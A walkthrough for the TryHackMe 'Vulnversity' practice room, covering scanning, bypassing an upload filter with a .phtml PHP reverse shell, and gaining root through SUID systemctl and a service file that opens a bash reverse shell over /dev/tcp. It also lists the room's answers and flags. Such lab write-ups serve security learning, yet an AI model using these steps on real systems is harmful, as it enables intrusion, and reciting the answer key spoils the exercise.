# **TryHackMe Vulnversity**
*Walkthrough using Kali Linux by Leonidas Karagkounis*

https://tryhackme.com/room/vulnversity

## **Reconnaissance**
Start by using nmap to scan for ports and services
```
nmap -sV <target_ip> 
```
1. **Scan the box, how many ports are open?**  
```
6
```
2. **What version of the squid proxy is running on the machine?** 
```
3.5.12
```
3. **How many ports will nmap scan if the flag -p-400 was used?**
```
400
```
4. **Using the nmap flag -n what will it not resolve?**  
```
DNS
```
5. **What is the most likely operating system this machine is running?**
```
Ubuntu
```
6. **What port is the web server running on?** 
```
3333
```

## **Locating directories using Gobuster**
Running gobuster to find hidden directories
```
gobuster dir --url http://<target_ip>:3333 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
1. **What is the directory that has an upload form page?** 
```
/internals/
```

## **Compromise the webserver**
Visit <target_ip>/internal/

You can start uploading files to find the extension that is blocked
1. **Try upload a few file types to the server, what common extension seems to be blocked?**  
```
.php
```

Start FoxyProxy and BurpSuite, upload a file and send the intercept to the intruder. Select Sniper attack and add for payload :
- php
- php3
- php4
- php5
- phtml

Then clear § and add § on the filename="hello.§php§" and start the attack. The only difference is noticed on phtml extension.

2. **Run this attack, what extension is allowed?** 
```
.phtml
```

### **Getting a reverse shell**

- Download php-reverse-shell from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

- Make a copy as php-reverse-shell.phtml. 

- Open the file and edit the $ip = '127.0.0.1' with your machine's ip. If you dont know what is your ip, type ifconfig and check the tun0 interface.

    *You can also change the $port = 1234 if you want to something else like 9001 for example which is what i did and if you follow along change it as well, otherwise make sure to change the commands later on with the appropriate port number.*

- Set up a netcat listener with the command :  
```
nc -nlvp 9001
```

- Upload the php-reverse-shell.phtml file to the webserver and go to the webpage 
```
http://<target_ip>:3333/internal/uploads/php-reverse-shell.phtml.
```
 
This will execute the script and return a reverse shell in your listener. 

### **Getting the user flag**
Start by typing cat /etc/passwd and it looks like we have one user at the end called bill.

3. **What is the name of the user who manages the webserver?** 
```
bill
```

Type 
```
cd /home/usr/bill
```
 Then 
 ```
 ls -al
 ``` 
 This reveals the user.txt flag. Type 
 ```
 cat user.txt
 ``` 
This should give you the user flag

4. **What is the user flag?** 
```
8bd7992fbe8a6ad22a63361004cfcedb
```

## **Privilege Escalation**
Start by typing 
```
find / -user root -perm /4000 2>/dev/null
```

1. **On the system, search for all SUID files. What file stands out?** 
```
/bin/systemctl
```

### **Getting a root shell**

- On your machine create a file called root.service. The content of the file should be this : 

        [Unit]
        Description=roooooooooot

        [Service]
        Type=simple
        User=root
        ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<your_ip>/9001 0>&1'

        [Install]
        WantedBy=multi-user.target


- Start a python http server using the command 
```
python3 -m http.server 8000
```

- On the target machine run the command  
```
find / -type d -maxdepth 2 -writable
``` 
This should reveal all writable directories. Use cd to get into one in our case cd /tmp

- Run the command 
```
wget http://<your_ip>:8000/root.service
```
This should get the root.service file from your machine to the target. 

- Stop the python server and start a listener with 
```
nc -nlvp 9001
```

- Use the command  
```
/bin/systemctl enable /tmp/root.service
```

- Use the command 
```
/bin/systemctl start root
```

- Now you should have a root shell on your listener

### **Geting the root flag**

Navigate into root folder by using 
```
cd /root
``` 
Type 
```
ls -al
``` 
You should see the root.txt flag. Check the content with 
```
cat root.txt
```

2. **Become root and get the last flag (/root/root.txt)**
```
a58ff8579f0a9270368d33a9966c7fd5
```
